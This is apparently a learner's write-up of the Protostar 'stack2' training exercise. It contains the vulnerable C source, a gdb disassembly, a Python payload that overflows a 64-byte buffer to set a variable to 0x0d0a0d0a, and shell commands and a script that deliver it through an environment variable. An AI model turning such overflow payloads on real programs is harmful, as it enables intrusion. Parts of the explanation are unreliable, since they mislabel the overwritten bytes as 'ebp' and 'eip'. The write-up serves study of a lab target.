# Stack2 - Buffer Overflow (Binary Exploitation)
## Owen Boreham
## 05/03/2021 (MM/DD/YYYY)

- Stack2 looks at environment variables, and how they can be set.
`This level is at /opt/protostar/bin/stack2`

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;                                            // Meaning that the variable can be changed at any time
  char buffer[64];                                                  // Creating a buffer for the stack
  char *variable;                                                   // Creating the variable(env) variable (pointer)

  variable = getenv("GREENIE");                                     // Looking for the environment variable "GREENIE"

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");     // If the variable does not exist, it throws an error
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```

Interesting getenv variable?

## Ideas

- *01: If we can make a shell script that creates the environment variable and a python script that will be our exploit to set the buffer to the same address as the variable ( maybe )

## Writeup

Since the stack2 source code is looking for an environment variable, in our shell script, we want to create an environment variable called GREENIE, but we aren't 100% sure what the value is supposed to be yet, but we can guess from the if statement at the end of the main function. In the if statement, it compares modified with `0x0d0a0d0a` which is hex for '\r\n\r\n'. With this knowledge, we know that the modified has to become `0x0d0a0d0a` which we can figure out the padding of those bytes in gdb.

If we take a look at the main function, we get:

```gdb
    (gdb) disassembl main 
    Dump of assembler code for function main:
    0x08048494 <main+0>:    push   ebp
    0x08048495 <main+1>:    mov    ebp,esp
    0x08048497 <main+3>:    and    esp,0xfffffff0
    0x0804849a <main+6>:    sub    esp,0x60
    0x0804849d <main+9>:    mov    DWORD PTR [esp],0x80485e0
    0x080484a4 <main+16>:   call   0x804837c <getenv@plt>
    0x080484a9 <main+21>:   mov    DWORD PTR [esp+0x5c],eax
    0x080484ad <main+25>:   cmp    DWORD PTR [esp+0x5c],0x0
    0x080484b2 <main+30>:   jne    0x80484c8 <main+52>
    0x080484b4 <main+32>:   mov    DWORD PTR [esp+0x4],0x80485e8
    0x080484bc <main+40>:   mov    DWORD PTR [esp],0x1
    0x080484c3 <main+47>:   call   0x80483bc <errx@plt>
    0x080484c8 <main+52>:   mov    DWORD PTR [esp+0x58],0x0
    0x080484d0 <main+60>:   mov    eax,DWORD PTR [esp+0x5c]
    0x080484d4 <main+64>:   mov    DWORD PTR [esp+0x4],eax
    0x080484d8 <main+68>:   lea    eax,[esp+0x18]
    0x080484dc <main+72>:   mov    DWORD PTR [esp],eax
0>> 0x080484df <main+75>:   call   0x804839c <strcpy@plt>
    0x080484e4 <main+80>:   mov    eax,DWORD PTR [esp+0x58]
    0x080484e8 <main+84>:   cmp    eax,0xd0a0d0a
    0x080484ed <main+89>:   jne    0x80484fd <main+105>
    0x080484ef <main+91>:   mov    DWORD PTR [esp],0x8048618
    0x080484f6 <main+98>:   call   0x80483cc <puts@plt>
    0x080484fb <main+103>:  jmp    0x8048512 <main+126>
    0x080484fd <main+105>:  mov    edx,DWORD PTR [esp+0x58]
    0x08048501 <main+109>:  mov    eax,0x8048641
    0x08048506 <main+114>:  mov    DWORD PTR [esp+0x4],edx
    0x0804850a <main+118>:  mov    DWORD PTR [esp],eax
    0x0804850d <main+121>:  call   0x80483ac <printf@plt>
    0x08048512 <main+126>:  leave  
    0x08048513 <main+127>:  ret    
    End of assembler dump.
```

First, if we look at address `0x080484df` (0) we copy the value of `0x804839c`. We are setting the stack pointer to the value of the variable which in our case, makes this super simple.
What we are going to want to do is just like in Stack3, create a python script that will create a padding for the bytes that we want to set the modified variable to. So just like in Stack3, we are going to make a script that almost containes exactly the same as Stack3.

```py
import struct

padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOO"
ebp = "AAAA"
eip = struct.pack("I", 0x0d0a0d0a)

print(padding + ebp + eip)
```

First, we import struct so that we can get the set the instruction pointer to \r\n in eip. We then also make the padding only up to `OOOO` which gives enough space to add for the base pointer `AAAA`. We concatonate all of these together in the print statement. The output should be what we expect "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOAAAA(carage return ( 0x0d0a0d0a ))"

So now, all it takes is the shell script, or we could even just doing it all from the terminal.
If we just want to terminal, we can run:

```bash
user@protostar:~$ export GREENIE=$(cat /tmp/exp)
user@protostar:~$ /opt/protostar/bin/stack2
you have correctly modified the variable
```

Or we can make a shell script that will do it for us + some extra features.

```bash
#!/bin/bash

ENV=$GREENIE;
FILE="/opt/protostar/bin/stack2";
EXPLOIT="/tmp/exploit.py";
EXPLOITOUT="/tmp/exp";
PYTHON="/usr/bin/python";

if [[ $ENV ]];then
  echo "GREENIE already exists";
  if [[ $GREENIE == $(cat $EXPLOITOUT) ]]; then
    if [[ -f $FILE ]]; then
      echo;
      echo "OUTPUT:"; $FILE;
    else
      echo "$FILE Does not exist";
      exit 1;
    fi
  else
    if [[ -f $EXPLOIT ]]; then
      if [[ -f $PYTHON ]]; then
        $PYTHON $EXPLOIT > $EXPLOITOUT;      # Piping the output of the exploit script into a file called exp in the temp directory
        export GREENIE=$(cat $EXPLOITOUT);   # Setting the GREENIE environment variable to the contents of exp file
      else
        echo "Missing python";
        exit 1;
      fi
    else
      echo "$EXPLOIT Does not exist";
      exit 1;
    fi
  fi
else
  echo "GREENIE doesn't exist";
  echo "Creating GREENIE";
  if [[ -f $EXPLOIT ]]; then
    if [[ -f $PYTHON ]]; then
      $PYTHON $EXPLOIT > $EXPLOITOUT;      # Piping the output of the exploit script into a file called exp in the temp directory
      export GREENIE=$(cat $EXPLOITOUT);   # Setting the GREENIE environment variable to the contents of exp file
    else
      echo "Missing python";
      exit 1;
    fi
  else
    echo "$EXPLOIT Does not exist";
    exit 1;
  fi

  if [[ -f $FILE ]]; then
    echo;
    echo "OUTPUT:"; $FILE;
  else
    echo "$FILE Does not exist";
    exit 1;
  fi
fi
```

Thats it for this exploit, thanks for reading, especially since this is my 1st Buffer Overflow that I done on my own, no tutorials || other write-ups.
